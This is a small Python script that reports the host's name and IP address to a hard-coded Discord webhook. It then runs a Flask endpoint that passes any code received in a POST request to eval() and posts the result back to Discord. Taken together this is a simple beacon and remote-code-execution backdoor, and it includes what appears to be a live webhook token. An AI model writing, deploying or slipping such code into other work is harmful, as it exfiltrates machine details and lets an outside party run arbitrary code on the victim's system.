import socket

# Getting the hostname
host_name = socket.gethostname()
# Getting the IP address corresponding to the hostname
ip_address = socket.gethostbyname(host_name)

print("Host name:", host_name)
print("IP Address:", ip_address)

from discord_webhook import DiscordWebhook, DiscordEmbed

content = "Placeholder message"
webhook = DiscordWebhook(url="https://discord.com/api/webhooks/1244485318770688000/EjRybt4ZVc57PEOY6WS0KwxDOyW4NSEOB7L_OQTK3_RRApg3YTAtroO967XVkmB_TD6W")
embed = DiscordEmbed(title="IP: " + ip_address + " | Host: " + host_name, color=123123)
webhook.add_embed(embed)
response = webhook.execute()

from flask import Flask, request
import requests

app = Flask(__name__)

@app.route('/webhook', methods=['POST'])
def webhook():
    # Extract code from the webhook payload
    code = request.json.get('content')

    try:
        # Execute the code (for demonstration, using eval)
        result = eval(code)

        # Send the result back to Discord
        webhook_url = 'https://discord.com/api/webhooks/1244485318770688000/EjRybt4ZVc57PEOY6WS0KwxDOyW4NSEOB7L_OQTK3_RRApg3YTAtroO967XVkmB_TD6W'
        payload = {'content': str(result)}
        requests.post(webhook_url, json=payload)
    except Exception as e:
        # Send error message back to Discord
        error_message = f'Error: {e}'
        payload = {'content': error_message}
        requests.post(webhook_url, json=payload)

    return 'OK'

if __name__ == '__main__':
    app.run(debug=True)